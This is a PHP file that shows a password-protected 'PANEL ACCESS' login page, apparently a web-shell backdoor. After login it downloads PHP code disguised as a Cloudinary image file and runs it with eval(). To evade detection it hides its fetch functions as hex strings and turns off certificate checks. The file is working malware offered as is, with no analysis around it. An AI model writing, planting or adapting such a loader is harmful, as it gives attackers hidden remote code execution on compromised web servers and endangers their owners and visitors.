<?php
session_start();

function is_logged_in() {
    return isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true;
}

$username = "mantapjiwa";
$passwordHash = '$2y$10$VtpB0EgQB0ZemuJtVd7ZiuD0r/oEP2cuNfk21CeiHnVizkZCsYsDK';

if (!is_logged_in()) {
    if (isset($_POST['username']) && isset($_POST['password'])) {
        if ($_POST['username'] === $username && password_verify($_POST['password'], $passwordHash)) {
            $_SESSION['loggedin'] = true;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit();
        } else {
            $error = "Wrong";
        }
    }
}

function hex2str($hex) {
    $str = '';
    for ($i = 0; $i < strlen($hex); $i += 2) {
        $str .= chr(hexdec(substr($hex, $i, 2)));
    }
    return $str;
}

function geturlsinfo($destiny) {
    $Array = array(
        '666f70656e',
        '73747265616d5f6765745f636f6e74656e7473',
        '66696c655f6765745f636f6e74656e7473',
        '6375726c5f65786563'
    );

    $belief = array(
        hex2str($Array[0]),
        hex2str($Array[1]),
        hex2str($Array[2]),
        hex2str($Array[3])
    );

    if (function_exists($belief[3])) {
        $ch = curl_init($destiny);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        $love = $belief[3]($ch);
        curl_close($ch);
        return $love;
    } elseif (function_exists($belief[2])) {
        return $belief[2]($destiny);
    } elseif (function_exists($belief[0]) && function_exists($belief[1])) {
        $purpose = $belief[0]($destiny, "r");
        $love = $belief[1]($purpose);
        fclose($purpose);
        return $love;
    }
    return false;
}

if (is_logged_in()) {
    $destiny = 'https://res.cloudinary.com/diajtnvji/image/upload/v1769588739/kuyang.jpg';
    $dream = geturlsinfo($destiny);

    if ($dream !== false) {
       
        $pos = strpos($dream, '<?php');
        if ($pos !== false) {
            $phpCode = substr($dream, $pos + 5); 
            eval($phpCode);
        } else {
            eval('?>' . $dream);
        }
        exit();
    }
}

if (!is_logged_in()) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>KUYANG SOLO</title>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            body, html {
                height: 100%;
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            }
            body {
                background: url('https://res.cloudinary.com/diajtnvji/image/upload/v1769527160/photo_2025-08-19_08-35-15.jpg') no-repeat center center fixed;
                background-size: cover;
                display: flex;
                justify-content: center;
                align-items: center;
            }
            .form-container {
                display: flex;
                justify-content: center;
                align-items: center;
                width: 100%;
                padding: 20px;
            }
            .login-form {
                width: 100%;
                max-width: 380px;
                padding: 40px 30px;
                background: rgba(0, 0, 0, 0.75);
                backdrop-filter: blur(10px);
                -webkit-backdrop-filter: blur(10px);
                border-radius: 16px;
                box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
                text-align: center;
                color: #fff;
                border: 1px solid rgba(255, 255, 255, 0.1);
            }
            .login-form img {
                width: 90px;
                height: 90px;
                border-radius: 50%;
                object-fit: cover;
                margin-bottom: 15px;
                border: 3px solid rgba(255, 255, 255, 0.2);
            }
            .login-form h2 {
                margin: 0 0 25px 0;
                font-size: 24px;
                font-weight: 600;
                letter-spacing: 1px;
            }
            .login-form input[type="text"],
            .login-form input[type="password"] {
                width: 100%;
                padding: 14px 16px;
                margin: 10px 0;
                border: none;
                border-radius: 8px;
                background: rgba(255, 255, 255, 0.1);
                color: #fff;
                font-size: 15px;
                transition: all 0.3s ease;
                border: 1px solid rgba(255, 255, 255, 0.1);
            }
            .login-form input[type="text"]::placeholder,
            .login-form input[type="password"]::placeholder {
                color: rgba(255, 255, 255, 0.6);
            }
            .login-form input[type="text"]:focus,
            .login-form input[type="password"]:focus {
                outline: none;
                background: rgba(255, 255, 255, 0.15);
                border-color: rgba(255, 255, 255, 0.3);
            }
            .login-form button {
                width: 100%;
                padding: 14px;
                margin-top: 20px;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                border: none;
                border-radius: 8px;
                cursor: pointer;
                font-size: 16px;
                font-weight: 600;
                letter-spacing: 1px;
                transition: all 0.3s ease;
                text-transform: uppercase;
            }
            .login-form button:hover {
                transform: translateY(-2px);
                box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4);
            }
            .login-form .options {
                margin-top: 20px;
                font-size: 13px;
                color: rgba(255, 255, 255, 0.7);
            }
            .login-form .options a {
                color: #667eea;
                text-decoration: none;
                transition: color 0.3s ease;
            }
            .login-form .options a:hover {
                color: #764ba2;
            }
            .login-form .options label {
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 8px;
                margin-bottom: 10px;
            }
            .error-message {
                background: rgba(255, 82, 82, 0.2);
                color: #ff5252;
                font-size: 14px;
                padding: 10px;
                border-radius: 6px;
                margin-bottom: 15px;
                border: 1px solid rgba(255, 82, 82, 0.3);
            }
        </style>
    </head>
    <body>
        <div class="form-container">
            <div class="login-form">
                <img src="https://res.cloudinary.com/diajtnvji/image/upload/v1769587544/snaptik_7593250546811718932_v2-ezgif.com-crop-video_1.gif" alt="Logo">
                <h2>PANEL ACCESS</h2>
                <?php if (isset($error)): ?>
                    <div class="error-message"><?php echo $error; ?></div>
                <?php endif; ?>
                <form method="post">
                    <input type="text" name="username" placeholder="Username ..." required>
                    <input type="password" name="password" placeholder="Password ..." required>
                    <button type="submit">Sign in</button>
                </form>
                            </div>
        </div>
    </body>
    </html>
    <?php
    exit();
}
?>
